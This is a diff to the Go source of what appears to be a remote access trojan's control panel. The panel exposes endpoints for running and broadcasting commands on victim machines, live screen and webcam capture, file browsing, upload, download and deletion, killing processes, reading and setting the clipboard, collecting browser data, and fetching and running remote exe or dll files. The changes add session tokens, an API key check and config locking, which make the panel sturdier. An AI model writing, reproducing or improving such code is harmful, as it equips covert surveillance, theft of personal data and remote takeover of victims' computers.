@@ -9,6 +9,7 @@ import (
 	"crypto/rsa"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"encoding/pem"
 	"fmt"
@@ -73,9 +74,14 @@ type Config struct {
 	HeartbeatInterval int    `json:"heartbeat_interval"`
 }
 
-var config Config
+var (
+	config   Config
+	configMu sync.RWMutex
+)
 
 func loadConfig() {
+	configMu.Lock()
+	defer configMu.Unlock()
 	data, err := os.ReadFile("json/config.json")
 	if err != nil {
 		log.Fatal("config.json okunamadı:", err)
@@ -89,7 +95,9 @@ func loadConfig() {
 }
 
 func saveConfig() error {
+	configMu.RLock()
 	data, err := json.MarshalIndent(config, "", "  ")
+	configMu.RUnlock()
 	if err != nil {
 		return err
 	}
@@ -440,6 +448,11 @@ func getStats() Stats {
 	s := int(uptime.Seconds()) % 60
 	uptimeStr := fmt.Sprintf("%02d:%02d:%02d", h, m, s)
 
+	configMu.RLock()
+	tcpPort := config.TCPPort
+	httpPort := config.HTTPPort
+	configMu.RUnlock()
+
 	return Stats{
 		ClientCount: count,
 		Uptime:      uptimeStr,
@@ -448,14 +461,18 @@ func getStats() Stats {
 		OS:          runtime.GOOS,
 		Arch:        runtime.GOARCH,
 		GoVersion:   runtime.Version(),
-		TCPPort:     config.TCPPort,
-		HTTPPort:    config.HTTPPort,
+		TCPPort:     tcpPort,
+		HTTPPort:    httpPort,
 	}
 }
 
 // ─── TCP Server ───────────────────────────────────────────
 func startTCPServer() {
-	ln, err := net.Listen("tcp", ":"+config.TCPPort)
+	configMu.RLock()
+	port := config.TCPPort
+	configMu.RUnlock()
+
+	ln, err := net.Listen("tcp", ":"+port)
 	if err != nil {
 		log.Fatal("TCP server başlatılamadı:", err)
 	}
@@ -733,13 +750,65 @@ func handleTCPClient(conn net.Conn) {
 	}
 }
 
-// ─── Auth ─────────────────────────────────────────────────
+// ─── Auth & Session Management ────────────────────────────
+type Session struct {
+	ID        string
+	ExpiresAt time.Time
+}
+
+var (
+	sessionStore   = make(map[string]Session)
+	sessionStoreMu sync.RWMutex
+)
+
+func generateSessionToken() string {
+	b := make([]byte, 16)
+	crand.Read(b)
+	return hex.EncodeToString(b)
+}
+
 func isAuthenticated(r *http.Request) bool {
 	cookie, err := r.Cookie("session")
 	if err != nil {
 		return false
 	}
-	return cookie.Value == "authenticated"
+
+	sessionStoreMu.RLock()
+	defer sessionStoreMu.RUnlock()
+
+	session, ok := sessionStore[cookie.Value]
+	if !ok {
+		return false
+	}
+
+	if time.Now().After(session.ExpiresAt) {
+		return false
+	}
+
+	return true
+}
+
+func isAPIAuthorized(r *http.Request) bool {
+	if !isAuthenticated(r) {
+		return false
+	}
+
+	apiKey := r.Header.Get("X-API-Key")
+	if apiKey == "" {
+		return false
+	}
+
+	configMu.RLock()
+	expectedKey := config.Key
+	configMu.RUnlock()
+
+	return apiKey == expectedKey
+}
+
+func writeJSONError(w http.ResponseWriter, message string, code int) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(code)
+	json.NewEncoder(w).Encode(map[string]string{"error": message})
 }
 
 // ─── HTTP Handlers ────────────────────────────────────────
@@ -748,8 +817,15 @@ func indexHandler(w http.ResponseWriter, r *http.Request) {
 		http.NotFound(w, r)
 		return
 	}
-	tmpl, _ := template.ParseFiles("html/index.html")
-	tmpl.Execute(w, nil)
+	tmpl, err := template.ParseFiles("html/index.html")
+	if err != nil {
+		log.Printf("Template error: %v", err)
+		http.Error(w, "Server Error", 500)
+		return
+	}
+	if err := tmpl.Execute(w, nil); err != nil {
+		log.Printf("Execution error: %v", err)
+	}
 }
 
 func loginGetHandler(w http.ResponseWriter, r *http.Request) {
@@ -757,25 +833,52 @@ func loginGetHandler(w http.ResponseWriter, r *http.Request) {
 		http.Redirect(w, r, "/dashboard", http.StatusFound)
 		return
 	}
-	tmpl, _ := template.ParseFiles("html/login.html")
-	tmpl.Execute(w, nil)
+	tmpl, err := template.ParseFiles("html/login.html")
+	if err != nil {
+		log.Printf("Template error: %v", err)
+		http.Error(w, "Server Error", 500)
+		return
+	}
+	if err := tmpl.Execute(w, nil); err != nil {
+		log.Printf("Execution error: %v", err)
+	}
 }
 
 func loginPostHandler(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
-	if r.FormValue("key") == config.Key {
+	configMu.RLock()
+	cfgKey := config.Key
+	configMu.RUnlock()
+	if r.FormValue("key") == cfgKey {
+		token := generateSessionToken()
+		expires := time.Now().Add(24 * time.Hour)
+
+		sessionStoreMu.Lock()
+		sessionStore[token] = Session{
+			ID:        token,
+			ExpiresAt: expires,
+		}
+		sessionStoreMu.Unlock()
+
 		http.SetCookie(w, &http.Cookie{
 			Name:     "session",
-			Value:    "authenticated",
+			Value:    token,
 			Path:     "/",
-			Expires:  time.Now().Add(24 * time.Hour),
+			Expires:  expires,
 			HttpOnly: true,
 		})
 		http.Redirect(w, r, "/dashboard", http.StatusFound)
 		return
 	}
-	tmpl, _ := template.ParseFiles("html/login.html")
-	tmpl.Execute(w, map[string]string{"Error": "Geçersiz key!"})
+	tmpl, err := template.ParseFiles("html/login.html")
+	if err != nil {
+		log.Printf("Template error: %v", err)
+		http.Error(w, "Server Error", 500)
+		return
+	}
+	if err := tmpl.Execute(w, map[string]string{"Error": "Geçersiz key!"}); err != nil {
+		log.Printf("Execution error: %v", err)
+	}
 }
 
 func dashboardHandler(w http.ResponseWriter, r *http.Request) {
@@ -783,17 +886,28 @@ func dashboardHandler(w http.ResponseWriter, r *http.Request) {
 		http.Redirect(w, r, "/login", http.StatusFound)
 		return
 	}
-	tmpl, _ := template.ParseFiles("html/dashboard.html")
+	tmpl, err := template.ParseFiles("html/dashboard.html")
+	if err != nil {
+		log.Printf("Template error: %v", err)
+		http.Error(w, "Server Error", 500)
+		return
+	}
 	list := getClients()
-	tmpl.Execute(w, map[string]interface{}{
+	configMu.RLock()
+	apiKey := config.Key
+	configMu.RUnlock()
+	if err := tmpl.Execute(w, map[string]interface{}{
 		"Clients": list,
 		"Count":   len(list),
-	})
+		"Key":     apiKey,
+	}); err != nil {
+		log.Printf("Execution error: %v", err)
+	}
 }
 
 func apiClientsHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -801,8 +915,8 @@ func apiClientsHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func apiSendHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
@@ -810,7 +924,7 @@ func apiSendHandler(w http.ResponseWriter, r *http.Request) {
 		Cmd string `json:"cmd"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, "Geçersiz istek", 400)
+		writeJSONError(w, "Invalid request", 400)
 		return
 	}
 	log.Printf("[API] Send → id=%s cmd=%s", req.ID, req.Cmd)
@@ -823,15 +937,15 @@ func apiSendHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func apiBroadcastHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
 		Cmd string `json:"cmd"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, "Geçersiz istek", 400)
+		writeJSONError(w, "Invalid request", 400)
 		return
 	}
 	broadcast(req.Cmd)
@@ -839,8 +953,8 @@ func apiBroadcastHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func apiOutputHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	id := r.URL.Query().Get("id")
@@ -854,8 +968,8 @@ func apiOutputHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func apiStatsHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -864,8 +978,8 @@ func apiStatsHandler(w http.ResponseWriter, r *http.Request) {
 
 // GET /api/screen?id=X → son frame base64 JPEG
 func apiScreenHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	id := r.URL.Query().Get("id")
@@ -887,8 +1001,8 @@ func apiScreenHandler(w http.ResponseWriter, r *http.Request) {
 
 // POST /api/screen/ctrl  { "id":"...", "action":"start"|"stop" }
 func apiScreenCtrlHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
@@ -897,7 +1011,7 @@ func apiScreenCtrlHandler(w http.ResponseWriter, r *http.Request) {
 		FPS    int    `json:"fps"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, "Geçersiz istek", 400)
+		writeJSONError(w, "Invalid request", 400)
 		return
 	}
 	client := getClientByID(req.ID)
@@ -906,7 +1020,11 @@ func apiScreenCtrlHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	fps := req.FPS
-	if fps <= 0 { fps = config.ScreenFPS }
+	if fps <= 0 {
+		configMu.RLock()
+		fps = config.ScreenFPS
+		configMu.RUnlock()
+	}
 	if fps <= 0 { fps = 10 }
 	var cmd string
 	if req.Action == "start" {
@@ -930,8 +1048,8 @@ func apiScreenCtrlHandler(w http.ResponseWriter, r *http.Request) {
 
 // GET /api/screen/status?id=X → screening aktif mi
 func apiScreenStatusHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	id := r.URL.Query().Get("id")
@@ -950,8 +1068,8 @@ func apiScreenStatusHandler(w http.ResponseWriter, r *http.Request) {
 
 // GET /api/cam?id=X → son kamera frame
 func apiCamHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	id := r.URL.Query().Get("id")
@@ -973,8 +1091,8 @@ func apiCamHandler(w http.ResponseWriter, r *http.Request) {
 
 // POST /api/cam/ctrl  { "id":"...", "action":"start"|"stop", "fps": N }
 func apiCamCtrlHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
@@ -983,7 +1101,7 @@ func apiCamCtrlHandler(w http.ResponseWriter, r *http.Request) {
 		FPS    int    `json:"fps"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, "Geçersiz istek", 400)
+		writeJSONError(w, "Invalid request", 400)
 		return
 	}
 	client := getClientByID(req.ID)
@@ -1015,8 +1133,8 @@ func apiCamCtrlHandler(w http.ResponseWriter, r *http.Request) {
 
 // GET /api/cam/status?id=X
 func apiCamStatusHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	id := r.URL.Query().Get("id")
@@ -1034,14 +1152,18 @@ func apiCamStatusHandler(w http.ResponseWriter, r *http.Request) {
 
 // POST /api/tasklist  { "id":"..." }
 func apiTasklistHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
+		return
+	}
 
 	// GET ve POST her ikisini de destekle
 	var id string
 	if r.Method == http.MethodPost {
-		var req struct { ID string `json:"id"` }
+		var req struct{ ID string `json:"id"` }
 		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-			http.Error(w, "bad request", 400); return
+			writeJSONError(w, "Bad request", 400)
+			return
 		}
 		id = req.ID
 	} else {
@@ -1076,7 +1198,10 @@ func apiTasklistHandler(w http.ResponseWriter, r *http.Request) {
 
 // POST /api/taskkill  { "id":"...", "pid": <number> }
 func apiTaskkillHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
+		return
+	}
 
 	// pid hem string hem int olarak gelebilir
 	var raw struct {
@@ -1084,7 +1209,8 @@ func apiTaskkillHandler(w http.ResponseWriter, r *http.Request) {
 		PID json.RawMessage `json:"pid"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&raw); err != nil {
-		http.Error(w, "bad request", 400); return
+		writeJSONError(w, "Bad request", 400)
+		return
 	}
 
 	// pid'i string'e çevir (int ya da string olabilir)
@@ -1161,58 +1287,94 @@ func fbRequest(w http.ResponseWriter, id, cmd, resultKind string, timeoutSec int
 
 // POST /api/fb/ls  { "id":"...", "path":"..." }
 func apiFBLsHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
-	var req struct { ID string `json:"id"`; Path string `json:"path"` }
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
+		return
+	}
+	var req struct{ ID string `json:"id"`; Path string `json:"path"` }
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSONError(w, "Bad request", 400)
+		return
+	}
 	fbRequest(w, req.ID, fmt.Sprintf("[ls]%s", req.Path), "ls_result", 10)
 }
 
 // POST /api/fb/download  { "id":"...", "path":"..." }
 func apiFBDownloadHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
-	var req struct { ID string `json:"id"`; Path string `json:"path"` }
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
+		return
+	}
+	var req struct{ ID string `json:"id"`; Path string `json:"path"` }
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSONError(w, "Bad request", 400)
+		return
+	}
 	fbRequest(w, req.ID, fmt.Sprintf("[download]%s", req.Path), "download_result", 60)
 }
 
 // POST /api/fb/delete  { "id":"...", "path":"..." }
 func apiFBDeleteHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
-	var req struct { ID string `json:"id"`; Path string `json:"path"` }
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
+		return
+	}
+	var req struct{ ID string `json:"id"`; Path string `json:"path"` }
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSONError(w, "Bad request", 400)
+		return
+	}
 	fbRequest(w, req.ID, fmt.Sprintf("[delete]%s", req.Path), "delete_result", 10)
 }
 
 // POST /api/fb/mkdir  { "id":"...", "path":"..." }
 func apiFBMkdirHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
-	var req struct { ID string `json:"id"`; Path string `json:"path"` }
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
+		return
+	}
+	var req struct{ ID string `json:"id"`; Path string `json:"path"` }
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSONError(w, "Bad request", 400)
+		return
+	}
 	fbRequest(w, req.ID, fmt.Sprintf("[mkdir]%s", req.Path), "mkdir_result", 10)
 }
 
 // POST /api/fb/upload  { "id":"...", "path":"...", "data":"base64" }
 func apiFBUploadHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
-	var req struct { ID string `json:"id"`; Path string `json:"path"`; Data string `json:"data"` }
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
+		return
+	}
+	var req struct{ ID string `json:"id"`; Path string `json:"path"`; Data string `json:"data"` }
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSONError(w, "Bad request", 400)
+		return
+	}
 	payload := req.Path + "|" + req.Data
 	fbRequest(w, req.ID, fmt.Sprintf("[upload]%s", payload), "upload_result", 30)
 }
 
 // POST /api/fb/rename  { "id":"...", "old":"...", "new":"..." }
 func apiFBRenameHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
-	var req struct { ID string `json:"id"`; Old string `json:"old"`; New string `json:"new"` }
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
+		return
+	}
+	var req struct{ ID string `json:"id"`; Old string `json:"old"`; New string `json:"new"` }
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSONError(w, "Bad request", 400)
+		return
+	}
 	payload := req.Old + "|" + req.New
 	fbRequest(w, req.ID, fmt.Sprintf("[rename]%s", payload), "rename_result", 10)
 }
 
 // POST /api/rfe  { "id":"...", "url":"...", "type":"exe"|"dll", "args":"..." }
 func apiRFEHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
@@ -1292,8 +1454,8 @@ func apiRFEHandler(w http.ResponseWriter, r *http.Request) {
 // Frontend bu JSON'u parse edip base64'ü blob'a çevirerek indirir.
 // Böylece Content-Type karışıklığından kaynaklanan JSON parse hatası olmaz.
 func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
@@ -1371,8 +1533,8 @@ func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
 // ─── Clipboard Manager ────────────────────────────────────
 // POST /api/clipboard/get  { "id":"..." }
 func apiClipboardGetHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
@@ -1416,8 +1578,8 @@ func apiClipboardGetHandler(w http.ResponseWriter, r *http.Request) {
 
 // POST /api/clipboard/set  { "id":"...", "text":"..." }
 func apiClipboardSetHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
@@ -1472,8 +1634,8 @@ func apiClipboardSetHandler(w http.ResponseWriter, r *http.Request) {
 
 // ─── Settings ─────────────────────────────────────────────
 func apiSettingsHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	if r.Method == http.MethodGet {
@@ -1488,8 +1650,10 @@ func apiSettingsHandler(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
+		configMu.Lock()
 		if req.TCPPort != "" && req.TCPPort != config.TCPPort {
 			if err := restartTCPServer(req.TCPPort); err != nil {
+				configMu.Unlock()
 				http.Error(w, err.Error(), 500)
 				return
 			}
@@ -1509,6 +1673,7 @@ func apiSettingsHandler(w http.ResponseWriter, r *http.Request) {
 			config.HeartbeatInterval = req.HeartbeatInterval
 			setHeartbeatInterval(req.HeartbeatInterval)
 		}
+		configMu.Unlock()
 
 		if err := saveConfig(); err != nil {
 			http.Error(w, "config kaydedilemedi: "+err.Error(), 500)
@@ -1522,8 +1687,8 @@ func apiSettingsHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func apiClientUpdateHandler(w http.ResponseWriter, r *http.Request) {
-	if !isAuthenticated(r) {
-		http.Error(w, "Unauthorized", 401)
+	if !isAPIAuthorized(r) {
+		writeJSONError(w, "Unauthorized", 401)
 		return
 	}
 	var req struct {
@@ -1550,6 +1715,13 @@ func apiClientUpdateHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func logoutHandler(w http.ResponseWriter, r *http.Request) {
+	cookie, err := r.Cookie("session")
+	if err == nil {
+		sessionStoreMu.Lock()
+		delete(sessionStore, cookie.Value)
+		sessionStoreMu.Unlock()
+	}
+
 	http.SetCookie(w, &http.Cookie{
 		Name:    "session",
 		Value:   "",
@@ -1605,6 +1777,10 @@ func main() {
 	http.HandleFunc("/api/client/update", apiClientUpdateHandler)
 	http.HandleFunc("/logout", logoutHandler)
 
-	fmt.Printf("HTTP server başlatıldı → http://localhost:%s\n", config.HTTPPort)
-	log.Fatal(http.ListenAndServe(":"+config.HTTPPort, nil))
+	configMu.RLock()
+	hPort := config.HTTPPort
+	configMu.RUnlock()
+
+	fmt.Printf("HTTP server başlatıldı → http://localhost:%s\n", hPort)
+	log.Fatal(http.ListenAndServe(":"+hPort, nil))
 }
